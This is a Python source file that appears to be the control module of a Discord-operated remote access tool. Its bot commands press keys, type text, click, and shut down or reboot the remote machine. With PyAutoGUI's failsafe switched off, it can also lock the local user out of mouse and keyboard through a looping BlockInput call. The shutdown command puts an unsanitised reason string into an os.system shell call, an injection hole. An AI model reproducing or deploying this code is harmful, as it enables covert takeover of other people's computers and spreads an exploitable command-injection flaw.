import os
import sys
import subprocess
import discord
from discord.ext import commands
import pyautogui
import ctypes
import threading
from src.client.core.platform import Platform

class Control(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.blocking = False
        # Disable PyAutoGUI's failsafe
        pyautogui.FAILSAFE = False

    @commands.command(name="press", help="Press a key (e.g., 'enter', 'tab', 'a').")
    async def press_key(self, ctx, key):
        try:
            pyautogui.press(key)
            await ctx.send(f"✅ Pressed key: `{key}`")
        except Exception as e:
            await ctx.send(f"❌ Error pressing key: {str(e)}")

    @commands.command(name="type", help="Type text on the remote machine.")
    async def type_text(self, ctx, *, text):
        try:
            pyautogui.write(text, interval=0.01)
            await ctx.send(f"✅ Typed text: `{text[:20]}...`")
        except Exception as e:
            await ctx.send(f"❌ Error typing: {str(e)}")

    @commands.command(name="hotkey", help="Press a hotkey (e.g., 'ctrl+c', 'win+r').")
    async def hotkey(self, ctx, *keys):
        try:
            pyautogui.hotkey(*keys)
            await ctx.send(f"✅ Pressed hotkey: `{' + '.join(keys)}`")
        except Exception as e:
            await ctx.send(f"❌ Error pressing hotkey: {str(e)}")

    @commands.command(name="click", help="Click at specific coordinates (x, y).")
    async def click(self, ctx, x: int, y: int):
        try:
            pyautogui.click(x, y)
            await ctx.send(f"✅ Clicked at `{x}, {y}`")
        except Exception as e:
            await ctx.send(f"❌ Error clicking: {str(e)}")

    @commands.command(name="shutdown", help="Shutdown the remote machine.")
    async def shutdown(self, ctx, reason: str = "System Maintenance"):
        try:
            if Platform.is_windows():
                os.system(f'shutdown /s /t 10 /c "{reason}"')
            else:
                os.system("shutdown now")
            await ctx.send(f"⚠️ Shutdown initiated: `{reason}`")
        except Exception as e:
            await ctx.send(f"❌ Shutdown Error: {str(e)}")

    @commands.command(name="reboot", help="Reboot the remote machine.")
    async def reboot(self, ctx):
        try:
            if Platform.is_windows():
                os.system("shutdown /r /t 10")
            else:
                os.system("reboot")
            await ctx.send("⚠️ Reboot initiated.")
        except Exception as e:
            await ctx.send(f"❌ Reboot Error: {str(e)}")

    @commands.command(name="block", help="Block mouse and keyboard (Windows Admin only).")
    async def block(self, ctx):
        if not Platform.is_windows():
            await ctx.send("❌ Blocking input is currently only supported on Windows.")
            return

        try:
            # We need admin for BlockInput
            self.blocking = True
            def block_thread():
                while self.blocking:
                    ctypes.windll.user32.BlockInput(True)
            
            threading.Thread(target=block_thread, daemon=True).start()
            await ctx.send("🔒 Mouse and keyboard BLOCKED.")
        except Exception as e:
            await ctx.send(f"❌ Block Error: {str(e)}")

    @commands.command(name="unblock", help="Unblock mouse and keyboard.")
    async def unblock(self, ctx):
        if Platform.is_windows():
            self.blocking = False
            ctypes.windll.user32.BlockInput(False)
            await ctx.send("🔓 Mouse and keyboard UNBLOCKED.")
        else:
            await ctx.send("❌ Not supported on this platform.")

async def setup(bot):
    await bot.add_cog(Control(bot))
